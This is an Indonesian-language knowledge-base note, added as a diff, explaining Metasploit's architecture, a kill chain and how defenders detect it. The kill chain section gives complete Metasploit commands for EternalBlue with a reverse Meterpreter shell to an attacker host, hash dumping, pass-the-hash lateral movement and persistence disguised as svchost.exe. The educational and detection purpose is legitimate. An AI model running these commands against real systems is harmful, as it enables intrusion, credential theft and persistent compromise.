@@ -1,0 +1,219 @@
+---
+title: Metasploit
+tags:
+- 02-pentest-frameworks
+- library
+- military-and-intelligence-tools
+created: '2026-06-27'
+updated: '2026-07-01'
+status: pending
+cssclasses:
+  - wide-table
+  - callout
+
+---
+
+> [!warning] Konteks Etis & Legal
+> Metasploit adalah framework resmi untuk penetration testing berizin. Seluruh pembahasan ini bersifat **edukasional** untuk defender, auditor keamanan, dan peneliti. Penggunaan modul exploit terhadap sistem tanpa izin tertulis adalah tindakan kriminal di hampir seluruh negara. Dokumen ini tidak memberikan instruksi langkah-demi-langkah untuk kegiatan ilegal.
+
+---
+
+## 🧬 Arsitektur Modular Metasploit
+
+Metasploit bukan sekadar kumpulan exploit. Ia adalah **ekosistem exploit delivery dan post-exploitation** yang dirancang agar komponen-komponennya bisa dicampur-cocokkan (mix-and-match). Inilah mengapa ia begitu powerful dan sulit dideteksi jika dikonfigurasi dengan benar.
+
+### Komponen Inti
+
+| Komponen | Fungsi | Detail Teknis |
+|----------|--------|---------------|
+| **Exploit** | Kode yang memicu kerentanan spesifik pada target. | Ditulis dalam Ruby (mayoritas) atau Python/Go/C melalui external modules. Berisi logika: koneksi ke target → kirim payload → trigger bug → eksekusi. |
+| **Payload** | Kode yang dieksekusi setelah exploit berhasil. Bisa berupa shell, VNC, atau agent. | Jenis: singles (self-contained), stagers (kecil, tarik stage), stages (payload besar yang ditarik stager). Contoh: `windows/x64/meterpreter_reverse_https`. |
+| **Encoder** | Mengubah payload untuk menghindari deteksi signature-based (IDS/AV) dan karakter buruk. | `x86/shikata_ga_nai` (polymorphic XOR additive feedback), `x64/xor_dynamic`, `cmd/powershell_base64`. |
+| **NOP Generator** | Menghasilkan sled NOP untuk exploit yang butuh landing zone presisi. | Arsitektur spesifik: `x86/opty2`, `armle/simple`. |
+| **Auxiliary Module** | Tool tambahan yang bukan exploit: scanner, fuzzer, brute-forcer, DoS tester. | `auxiliary/scanner/smb/smb_version`, `auxiliary/scanner/portscan/tcp`. |
+| **Post Module** | Modul untuk eskalasi, pengumpulan informasi, dan lateral movement setelah sesi terbuka. | `post/multi/gather/hashdump`, `post/windows/gather/enum_domain`. |
+| **Listener** | Menunggu koneksi balik dari payload (reverse connection) atau menyediakan bind shell. | `exploit/multi/handler` dengan payload generik. Mendukung protokol: TCP, HTTP/S, DNS, Named Pipe. |
+
+### Mix-and-Match: Satu Exploit, Banyak Kemungkinan
+
+```
+Exploit: windows/smb/ms17_010_eternalblue
+    ├── Payload A: windows/x64/meterpreter/reverse_https
+    │       └── Encoder: x64/xor_dynamic
+    │              └── NOP: x64/simple (opsional, untuk padding)
+    │
+    ├── Payload B: windows/shell_reverse_tcp
+    │       └── Encoder: x86/shikata_ga_nai (5 iterasi)
+    │
+    └── Payload C: generic/custom
+            └── (shellcode buatan sendiri, misal: Cobalt Strike beacon)
+```
+
+Satu kerentanan (EternalBlue) bisa digunakan untuk:
+- Mendapatkan shell interaktif (`shell_reverse_tcp`).
+- Mendapatkan sesi Meterpreter yang kaya fitur (keylogging, screenshot, pivoting).
+- Mengirimkan agent C2 kustom seperti Cobalt Strike beacon langsung dari modul exploit.
+
+---
+
+## ☠️ Kill Chain dengan Metasploit: Dari Recon sampai Domain Admin
+
+### Fase 1: Reconnaissance & Targeting
+
+Penyerang (red team atau APT) mengidentifikasi target menggunakan data yang mungkin berasal dari [[shodan]], Nmap, atau OSINT lain.
+
+```bash
+# Contoh: scan subnet internal setelah foothold awal
+use auxiliary/scanner/smb/smb_version
+set RHOSTS 10.0.1.0/24
+run
+```
+
+Hasil: daftar host Windows dengan versi SMB, termasuk yang rentan EternalBlue.
+
+### Fase 2: Exploitation & Payload Delivery
+
+Modul exploit dijalankan dengan payload reverse. Karena banyak perimeter firewall memblokir koneksi masuk, **reverse connection** adalah standar.
+
+```bash
+use exploit/windows/smb/ms17_010_eternalblue
+set RHOSTS 10.0.1.25
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 192.168.45.2
+set LPORT 443
+exploit -j  # jalankan sebagai job, jangan blocking
+```
+
+Yang terjadi secara teknis:
+1. Metasploit membuka socket di LHOST:LPORT dan menghasilkan payload shellcode Meterpreter.
+2. Shellcode dienkode, disisipkan ke dalam exploit buffer.
+3. Exploit mengirimkan paket SMB jahat yang memicu buffer overflow di `srv.sys`.
+4. Overflow menimpa return address → shellcode dieksekusi dalam konteks kernel.
+5. Shellcode (stager) menghubungi listener, mengunduh stage utama (Meterpreter DLL), dan memuatnya langsung ke memori tanpa menyentuh disk.
+
+### Fase 3: Post-Exploitation & Situational Awareness
+
+Setelah sesi Meterpreter aktif (`sessions -i 1`):
+
+```bash
+sysinfo           # info OS, arsitektur, hostname
+getuid            # lihat user saat ini (biasanya SYSTEM)
+getprivs          # lihat privileges
+ps                # daftar proses
+migrate 1234      # pindahkan agent ke proses lain (misal: lsass.exe)
+```
+
+Meterpreter berjalan **sepenuhnya di dalam memori**. Tidak ada file yang ditulis ke disk pada tahap ini (kecuali migrasi ke proses yang memerlukan penulisan sementara di `%TEMP%` pada beberapa varian).
+
+### Fase 4: Credential Dumping & Lateral Movement
+
+```bash
+# Dump hash password dari SAM & LSA Secrets
+hashdump           # jika SYSTEM
+use post/windows/gather/lsa_secrets
+run
+
+# Jika ada domain controller terlihat, coba Pass-The-Hash
+use exploit/windows/smb/psexec
+set SMBUser Administrator
+set SMBPass aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99
+set RHOSTS 10.0.1.10
+set PAYLOAD windows/x64/meterpreter/reverse_https
+set LHOST 192.168.45.2
+exploit
+```
+
+Teknik **Pass-The-Hash** (PtH) memungkinkan penyerang menggunakan hash NTLM mentah alih-alih password plaintext untuk otentikasi ke SMB. Ini adalah salah satu teknik lateral movement paling mematikan dan diandalkan oleh aktor APT.
+
+### Fase 5: Persistence
+
+```bash
+# Jadwalkan task untuk menjalankan agent setiap jam
+use post/windows/manage/persistence_exe
+set SESSION 1
+set REXENAME svchost.exe
+set STARTUP SYSTEM
+run
+```
+
+Modul ini membuat entri registry di `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` atau membuat scheduled task. Agent yang di-drop dienkripsi dan dinamai mirip proses asli Windows (`svchost.exe`, `spoolsv.exe`).
+
+---
+
+## 🛡️ Deteksi Metasploit: Mencari Jejak di Log, Memori, dan Jaringan
+
+### 1. Deteksi Jaringan
+
+- **Meterpreter reverse HTTPS default**: JA3 fingerprint TLS dan struktur header HTTP dapat dikenali. Konfigurasi default Metasploit memiliki cipher suite yang khas (contoh: `TLS_RSA_WITH_AES_256_CBC_SHA`).
+- **Beaconing pattern**: Heartbeat Meterpreter dikirim setiap ~5 detik (default) dengan sedikit jitter. Analisis NetFlow atau IDS bisa mendeteksi interval reguler ini.
+- **Payload dalam HTTP body**: Beberapa stager menggunakan URI atau User-Agent yang tidak wajar. Snort/Suricata memiliki signature spesifik.
+
+### 2. Deteksi Host (Endpoint)
+
+- **Meterpreter di memori**: Proses yang mengeksekusi `ReflectiveLoader` atau memiliki region memori dengan `PAGE_EXECUTE_READWRITE` dan tanpa file pendukung di disk. EDR menggunakan *memory forensics* untuk menemukan ini.
+- **Migrasi proses**: `migrate` ke `lsass.exe` adalah anomali besar. Monitor `OpenProcess` dengan `PROCESS_VM_WRITE` dan `PROCESS_CREATE_THREAD` ke proses sensitif.
+- **Registry persistence**: Key di `Run` atau `Scheduled Tasks` yang mengeksekusi executable dari `%APPDATA%` atau `%TEMP%`.
+
+### 3. Artefak Spesifik
+
+| Artefak | Lokasi / Metode Deteksi |
+|---------|--------------------------|
+| **Stager URI** | Log proxy/web: GET `/aBcDe` atau URI pendek acak. |
+| **Meterpreter User-Agent** | Default: `Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)` — tapi bisa diubah. |
+| **Registry Run Key** | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\` dengan nilai executable di `%TEMP%`. |
+| **WMI Persistence** | `__EventFilter` dan `__EventConsumer` di `ROOT\subscription` jika menggunakan modul WMI. |
+| **Named Pipe** | `\\.\pipe\msf_*` untuk komunikasi internal Meterpreter pada pivoting. |
+| **Service Creation** | Service baru dengan nama acak seperti `RghOplmn` yang tiba-tiba muncul dan berhenti. |
+
+### 4. Counter-Detection oleh Metasploit
+
+- **Stage encoding & encryption**: Stage dienkripsi AES-256-CBC, kunci ditukar via RSA-4096.
+- **Malleable C2 (via external module)**: Framework seperti Cobalt Strike (yang dibangun di atas konsep Metasploit) memungkinkan profil C2 yang sepenuhnya kustom. Metasploit native memiliki fleksibilitas lebih rendah, tapi bisa digabungkan.
+- **Sleep & Jitter**: Konfigurasi `SessionCommunicationTimeout` dan `SessionExpirationTimeout` bisa diubah untuk memperlambat beacon dan menghindari deteksi interval tetap.
+
+---
+
+## ↔️ Dual-Use Spektrum: Metasploit di Tangan Mana?
+
+```
+DEFENSE ◄────────────────────────────────────────────► OFFENSE
+
+Sysadmin                    Auditor                  APT Group
+│                           │                        │
+Mengecek patch              Simulasi serangan        Initial access
+dengan auxiliary scanner    penuh dengan             ke target korporat
+(smb_version)               skenario real            (EternalBlue, BlueKeep)
+│                           │                        │
+│                           │                        ▼
+▼                           ▼                        Ransomware operator
+Memvalidasi                 Mendapatkan              (Conti, LockBit)
+konfigurasi firewall        Domain Admin             menggunakan
+dan exposure                dalam 4 jam              Metasploit untuk
+└────────────────────────────────────────────────────┘ lateral movement
+```
+
+Metasploit tidak memiliki atribut moral. Yang membedakan adalah **otorisasi, tujuan, dan pengawasan**. Auditor yang sama yang menggunakan `windows/smb/ms17_010_eternalblue` untuk membuktikan risiko ke manajemen, bisa juga melakukan hal yang persis sama untuk mencuri data. Transparansi dan kontrak legal adalah satu-satunya pagar.
+
+---
+
+## 🔗 Koneksi dalam Vault
+
+- [[shodan]] — Setelah Shodan mengidentifikasi host dengan port terbuka, Metasploit digunakan untuk exploitasi. Query Shodan seperti `vuln:CVE-2019-0708` (BlueKeep) langsung memberi target untuk modul `exploit/windows/rdp/cve_2019_0708_bluekeep`.
+- [[bloodhound]] — Setelah sesi Meterpreter didapat, data AD diambil (`post/windows/gather/bloodhound`) lalu diimpor ke BloodHound untuk mencari path ke Domain Admin.
+- [[cobalt-strike]] — Cobalt Strike menggunakan ekosistem yang kompatibel dengan Metasploit; payload Cobalt dapat di-deliver via modul exploit Metasploit (`generic/custom`). Sebaliknya, sesi Meterpreter bisa di-upgrade ke Beacon Cobalt Strike.
+- **DARKCOMET** — Legacy RAT yang juga bisa di-deliver via Metasploit exploit; keduanya berbagi konsep payload delivery.
+- [[empire]] — Post-exploitation framework berbasis PowerShell yang bersaing, tetapi sering digunakan berdampingan. Metasploit untuk exploit awal, Empire untuk lateral movement yang stealthier (karena PowerShell sering diizinkan).
+
+---
+
+## 📚 Referensi
+
+- Kennedy, D., O'Gorman, J., Kearns, D., & Aharoni, M. (2011). *Metasploit: The Penetration Tester's Guide*. No Starch Press.
+- Rapid7 Documentation: https://docs.rapid7.com/metasploit/
+- Offensive Security. *Penetration Testing with Kali Linux (PWK)* courseware.
+- MITRE ATT&CK: Techniques for Exploitation (T1203, T1210), Credential Dumping (T1003), Lateral Movement (T1021).
+- Snort/Suricata rules for Metasploit payloads (Emerging Threats).
+
+---
+
+*Metasploit Deep Dive | Exploit Delivery & Post-Exploitation Framework | Dual-Use Pentest Arsenal*
